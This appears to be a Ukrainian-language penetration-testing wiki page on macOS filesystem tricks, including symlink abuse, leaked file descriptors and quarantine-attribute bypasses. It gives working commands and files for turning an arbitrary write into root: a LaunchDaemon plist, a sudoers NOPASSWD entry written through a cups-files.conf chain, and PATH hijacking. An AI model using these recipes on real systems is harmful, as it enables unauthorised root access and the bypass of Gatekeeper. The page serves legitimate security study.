# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Комбінації POSIX permissions

Permissions у **directory**:

- **read** — ви можете **перераховувати** записи directory
- **write** — ви можете **видаляти/записувати** **files** у directory, а також **видаляти порожні folders**.
- Але ви **не можете видаляти/змінювати непорожні folders**, якщо не маєте write permissions над ними.
- Ви **не можете змінювати назву folder**, якщо не є її власником.
- **execute** — вам **дозволено переходити** через directory — якщо ви не маєте цього права, ви не можете отримати доступ до будь-яких files усередині неї або в будь-яких subdirectories.

### Небезпечні комбінації

**Як перезаписати file/folder, власником якого є root**, якщо:

- Власником однієї батьківської **directory** у path є user
- Власником однієї батьківської **directory** у path є **users group** із **write access**
- **Users group** має **write** access до **file**

За будь-якої з наведених комбінацій attacker може **вставити** **sym/hard link** у потрібний path, щоб отримати привілейований довільний запис.

### Особливий випадок Folder root R+X

Якщо у **directory** є files, до яких **лише root має R+X access**, вони **недоступні нікому іншому**. Отже, vulnerability, яка дозволяє **перемістити file, доступний для читання user**, але який неможливо прочитати через це **обмеження**, з цієї folder **в іншу**, може бути використана для читання цих files.

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

Якщо privileged process записує дані у **file**, який може бути **контрольований** **lower privileged user** або який міг бути **попередньо створений** lower privileged user. User може просто **спрямувати його на інший file** через Symbolic або Hard link, і privileged process записуватиме саме в цей file.

Перегляньте інші sections, де attacker може **зловживати довільним записом для підвищення privileges**.

### Open `O_NOFOLLOW`

Згідно з [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Перевіряється лише **кінцевий** компонент — кожен **проміжний** компонент усе ще розв’язується та переходиться. Тому developer, який «захистив» запис за допомогою `O_NOFOLLOW`, усе ще може бути атакований через розміщення symlink у будь-якій **батьківській directory** цільового path.

На тій самій man page задокументовано flags, які фактично усувають цю проблему:

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

В іншому разі `openat()` відносно directory FD, який ви вже перевірили, або `realpath()` + повторна перевірка залишаються способами зупинити symlink swaps у проміжних компонентах path.

## .fileloc

Files із розширенням **`.fileloc`** можуть вказувати на інші applications або binaries, тому під час їх відкриття буде виконано саме цю application/binary.\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Дескриптори файлів

### Leak FD (no `O_CLOEXEC`)

Якщо виклик `open` не містить прапорця `O_CLOEXEC`, дескриптор файлу буде успадкований дочірнім процесом. Отже, якщо привілейований процес відкриває привілейований файл і запускає процес, контрольований attacker, attacker **успадкує FD для привілейованого файлу**.

Канонічним прикладом є **`DYLD_PRINT_TO_FILE` LPE в OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld` обробляв `DYLD_PRINT_TO_FILE=/path` навіть у **restricted (suid root) binaries**, оскільки цю змінну розбирали поза межами `processDyldEnvironmentVariable()`.
- Він виконував `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, тому **створював файл, власником якого був root, за довільним шляхом**.
- FD **ніколи не закривався і не мав прапорця close-on-exec**, тому кожен дочірній процес suid binary успадковував **доступний для запису FD до файлу, власником якого був root**.
- Запуск, наприклад, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, а потім читання номера успадкованого FD у дочірньому процесі, давав змогу довільно записувати у файли, власником яких був root; `fcntl(fd, F_SETFL, 0)` навіть очищав `O_APPEND`, дозволяючи перезаписувати файл замість додавання в кінець.

Та сама схема виникає щоразу, коли привілейований процес відкриває файл **до** виконання `exec` чогось, що ви контролюєте (допоміжні інструменти, редактори у стилі `crontab`, запущені через `$EDITOR`, файли журналів/налагодження, відкриті за шляхом із env-var...). Перелічити успадковані FD можна за допомогою:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Будь-яке значення понад `2`, яке вказує на файл, що ви не можете відкрити самостійно, є примітивом довільного запису (або довільного читання).

## Уникайте трюків із quarantine xattrs

### Видаліть його
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Якщо файл/папка має цей immutable атрибут, додати до нього xattr буде неможливо
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Файлові системи без підтримки xattr

Не кожна файлова система, яку macOS може підключити, нативно зберігає **розширені атрибути**. HFS+ і APFS це підтримують; **FAT32, exFAT і (більшість) монтувань NFS — ні** — macOS емулює їх, записуючи додатковий файл **AppleDouble** із назвою `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Це важливо для quarantine, оскільки xattr зберігається лише тоді, коли його справді можна записати **і знову прочитати** з того самого тому:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Якщо том пізніше читається через шлях, який ігнорує супровідний файл `._` (або супровідний файл видаляється), файл надходить **без quarantine flag** — а `.app` без quarantine достатньо, щоб обійти App Sandbox, як описано в [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Цей ACL забороняє додавати `xattrs` до файлу
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Формат файлів **AppleDouble** копіює файл разом із його ACE.

У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Отже, якщо стиснути application у zip-файл у форматі **AppleDouble** з ACL, який забороняє запис інших xattr до нього... quarantine xattr не буде встановлено в application:

Перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/), щоб дізнатися більше.

Для відтворення цього спочатку потрібно отримати правильний рядок ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Зверніть увагу, що навіть якщо це працює, sandbox спочатку записує quarantine xattr)

Не обов'язково, але залишаю це тут про всяк випадок:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass перевірок підпису

### Bypass перевірок platform binaries

Деякі перевірки безпеки перевіряють, чи є binary **platform binary**, наприклад щоб дозволити підключення до XPC service. Однак, як показано в описі bypass на https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, цю перевірку можна обійти, отримавши platform binary (наприклад, /bin/ls) і впровадивши exploit через dyld за допомогою змінної середовища `DYLD_INSERT_LIBRARIES`.

### Bypass прапорців `CS_REQUIRE_LV` і `CS_FORCED_LV`

Запущений binary може змінити власні прапорці, щоб обійти перевірки, за допомогою коду на кшталт:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles містять файл **`_CodeSignature/CodeResources`**, який містить **hash** кожного окремого **файлу** в **bundle**. Зверніть увагу, що **hash** CodeResources також **вбудований у виконуваний файл**, тому ми не можемо змінити й його.

Однак є деякі файли, підпис яких не перевірятиметься. Для них у plist вказано ключ omit, наприклад:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Можна обчислити підпис ресурсу з CLI за допомогою:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Підключення dmg

Користувач може підключити створений ним custom dmg навіть поверх деяких наявних папок. Ось як можна створити custom dmg-пакет із власним вмістом:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Зазвичай macOS монтує диски через Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (який надається `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до plist-файлу LaunchDaemons і перезапустити службу, логи зберігатимуться у `/var/log/diskarbitrationd.log`.\
Однак можна використовувати такі інструменти, як `hdik` і `hdiutil`, щоб безпосередньо взаємодіяти з kext `com.apple.driver.DiskImages`.

## Довільний запис

### Періодичні sh-скрипти

Якщо ваш скрипт може інтерпретуватися як **shell script**, ви можете перезаписати **`/etc/periodic/daily/999.local`** shell script, який запускатиметься щодня.

Ви можете **імітувати** виконання цього скрипту за допомогою: **`sudo periodic daily`**

### Демони

Створіть довільний **LaunchDaemon**, наприклад **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, із plist, що запускає довільний скрипт, наприклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Просто створіть script `/Applications/Scripts/privesc.sh` із **commands**, які ви хочете виконати від імені root.

### Sudoers File

Якщо у вас є **arbitrary write**, ви можете створити файл у папці **`/etc/sudoers.d/`**, надавши собі привілеї **sudo**.

### PATH files

Файл **`/etc/paths`** є одним із основних місць, звідки заповнюється змінна середовища PATH. Для його перезапису потрібні права root, але якщо script із **privileged process** виконує певну **command без повного шляху**, ви можете отримати змогу **hijack** її, змінивши цей файл.

Ви також можете записувати файли до **`/etc/paths.d`**, щоб додавати нові папки до змінної середовища `PATH`.

### cups-files.conf

Цю техніку використано в [цьому writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Створіть файл `/etc/cups/cups-files.conf` із таким вмістом:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Це створить файл `/etc/sudoers.d/lpe` із дозволами 777. Додатковий непотрібний текст наприкінці потрібен для запуску створення журналу помилок.

Потім запишіть у `/etc/sudoers.d/lpe` потрібну конфігурацію для підвищення привілеїв, наприклад `%staff ALL=(ALL) NOPASSWD:ALL`.

Після цього знову змініть файл `/etc/cups/cups-files.conf`, вказавши `LogFilePerm 700`, щоб новий файл sudoers став дійсним під час виклику `cupsctl`.

### Вихід із sandbox

Із macOS sandbox можна вийти за допомогою FS arbitrary write. Приклади наведено на сторінці [macOS Auto Start](../../../../macos-auto-start-locations.md), але поширений спосіб полягає в записі файлу налаштувань Terminal у `~/Library/Preferences/com.apple.Terminal.plist`, який виконує команду під час запуску, а потім виклику його за допомогою `open`.

## Створення доступних для запису файлів від імені інших користувачів

Дуже поширений примітив для підвищення привілеїв — змусити **привілейований процес створити для вас файл** у каталозі, яким ви керуєте, а потім зберегти **доступ на запис** до цього файлу. Потрібні два компоненти:

1. Каталог, власником якого ви є (або в якому можна встановити **успадковуваний ACL**), щоб усе створене всередині успадковувало ваші дозволи.
2. Привілейований процес/процес із `suid`, якому можна вказати, **де** створити файл — зазвичай через змінну середовища для налагодження/журналювання, конфігураційний файл або XPC API допоміжного процесу.

Саме **успадковуваний ACL** забезпечує можливість запису у створений файл, навіть якщо його власником є інший користувач. Прапорці успадкування `file_inherit` / `directory_inherit` описано в [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Тепер будь-який файл, який привілейований процес створює всередині `$DIRNAME`, **доступний вам для запису**. Якщо цей каталог також є місцем, звідки пізніше виконується код **від імені root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, каталог LaunchDaemon...), це пряме підвищення привілеїв до root. Див. розділи [Sudoers File](#sudoers-file) і [cups-files.conf](#cups-filesconf) вище, щоб дізнатися, що записати після отримання файлу.

Повний практичний приклад ланцюжка "змінна середовища змушує root-процес створити файл, а FD витікає до вас" наведено вище в розділі [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## Спільна пам'ять POSIX

**Спільна пам'ять POSIX** дає змогу процесам у POSIX-сумісних операційних системах отримувати доступ до спільної області пам'яті, забезпечуючи швидшу комунікацію порівняно з іншими методами міжпроцесної взаємодії. Вона передбачає створення або відкриття об'єкта спільної пам'яті за допомогою `shm_open()`, задання його розміру через `ftruncate()` і відображення в адресний простір процесу за допомогою `mmap()`. Після цього процеси можуть безпосередньо читати з цієї області пам'яті та записувати до неї. Для керування одночасним доступом і запобігання пошкодженню даних часто використовують механізми синхронізації, такі як mutex або семафори. Зрештою процеси скасовують відображення та закривають спільну пам'ять за допомогою `munmap()` і `close()`, а за потреби видаляють об'єкт пам'яті через `shm_unlink()`. Ця система особливо ефективна для швидкого IPC у середовищах, де кільком процесам потрібно оперативно отримувати доступ до спільних даних.

<details>

<summary>Приклад коду Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Приклад коду споживача</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Захищені дескриптори macOS

**macOSCguarded descriptors** — це функція безпеки, представлена в macOS для підвищення безпеки та надійності **операцій з файловими дескрипторами** в користувацьких застосунках. Ці захищені дескриптори дають змогу пов’язувати з файловими дескрипторами певні обмеження або «захисти», які застосовуються kernel.

Ця функція особливо корисна для запобігання певним класам вразливостей безпеки, таким як **несанкціонований доступ до файлів** або **race conditions**. Такі вразливості виникають, наприклад, коли thread отримує доступ до file description, надаючи **іншому вразливому thread доступ до нього**, або коли file descriptor **успадковується** вразливим child process. Деякі функції, пов’язані з цією функціональністю:

- `guarded_open_np`: Відкриває FD із guard
- `guarded_close_np`: Закриває його
- `change_fdguard_np`: Змінює прапорці guard у дескрипторі (навіть видаляючи захист guard)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
